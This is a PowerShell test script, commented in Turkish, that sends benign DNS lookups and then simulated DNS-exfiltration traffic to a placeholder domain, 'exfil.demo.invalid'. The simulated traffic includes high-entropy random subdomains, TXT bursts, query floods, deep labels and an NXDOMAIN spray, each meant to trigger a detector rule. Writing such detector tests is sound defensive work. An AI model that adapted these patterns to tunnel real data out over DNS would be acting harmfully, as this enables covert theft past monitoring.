Param(
  [string]$Server = "1.1.1.1",
  [string]$Root   = "exfil.demo.invalid",
  [int]$SleepMs   = 40
)

function RndBase32([int]$n=48){
  $chars = "abcdefghijklmnopqrstuvwxyz234567"
  -join (1..$n | ForEach-Object { $chars[(Get-Random -Max $chars.Length)] })
}

function Q([string]$name,[string]$type="A"){
  try {
    $null = Resolve-DnsName -Name $name -Server $Server -Type $type -ErrorAction SilentlyContinue
  } catch {
    $null = (nslookup -type=$type $name $Server) | Out-Null
  }
  Start-Sleep -Milliseconds $SleepMs
}

Write-Host "== GOOD (beklenen: alarm yok) ==" -ForegroundColor Green
$good = @(
  "www.microsoft.com","www.google.com","www.cloudflare.com",
  "www.wikipedia.org","spclient.wg.spotify.com"
)
$good | ForEach-Object { Q $_ "A" }

Write-Host "== BAD (beklenen: alarm var ve farklı reasons) ==" -ForegroundColor Yellow

# 1) Basit uzun ad (len)
Q ("sub1.{0}" -f $Root) "A"

# 2) TXT burst (txt_ratio)
1..5 | ForEach-Object { Q ("sub2.{0}" -f $Root) "TXT" }

# 3) Uzun + yüksek entropi (entropy)
$rand = "{0}.sub3.{1}" -f (RndBase32 62), $Root
Q $rand "A"
Q $rand "TXT"
# (Ayrıca listedeki sabit isme de bir istek at)
Q ("sub3.{0}" -f $Root) "A"

# 4) QPS burst (qps_client)
1..25 | ForEach-Object { Q ("sub4.{0}" -f $Root) "A" }

# 5) Derin label (label_count)
$deep = ("l1.l2.l3.l4.l5.l6.l7.l8.l9.sub5.{0}" -f $Root)
Q $deep "A"
# (Ayrıca sabit isme de bir istek)
Q ("sub5.{0}" -f $Root) "A"

# 6) NX spray (nxdomain_ratio) - .invalid
1..20 | ForEach-Object { Q ("no{0}.invalid" -f (Get-Random -Max 1000000)) "A" }

Write-Host "`nBitti. Trafik gönderildi (yakalama ayrı adımda yapılacak)."
